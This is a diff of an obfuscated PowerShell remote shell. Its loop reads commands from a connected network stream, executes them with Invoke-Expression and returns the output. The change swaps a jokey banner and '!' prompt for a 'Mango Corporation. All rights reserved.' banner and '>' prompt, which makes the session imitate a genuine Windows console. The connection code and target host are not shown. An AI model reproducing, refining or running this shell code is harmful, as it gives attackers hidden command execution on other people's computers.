@@ -14,8 +14,8 @@ try {
     $apricot = New-Object IO.StreamWriter($cherry)
     $apricot.AutoFlush = $true
     $banana = New-Object IO.StreamReader($cherry)
-    $apricot.WriteLine("(!) Mango Corp :P`n`n")
-    $apricot.Write((pwd).Path + '! ')
+    $apricot.WriteLine("(c) Mango Corporation. All rights reserved.`n`n")
+    $apricot.Write((pwd).Path + '> ')
 
     while ($plum.Connected) {
         $fig = $banana.ReadLine()
@@ -24,10 +24,10 @@ try {
                 $grape = Invoke-Expression $fig 2>&1 | Out-String
                 $apricot.WriteLine($fig)  
                 $apricot.WriteLine($grape)
-                $apricot.Write((pwd).Path + '! ')
+                $apricot.Write((pwd).Path + '> ')
             } catch {
                 $apricot.WriteLine("ERROR: $_")
-                $apricot.Write((pwd).Path + '! ')  
+                $apricot.Write((pwd).Path + '> ')  
             }
         }
     }
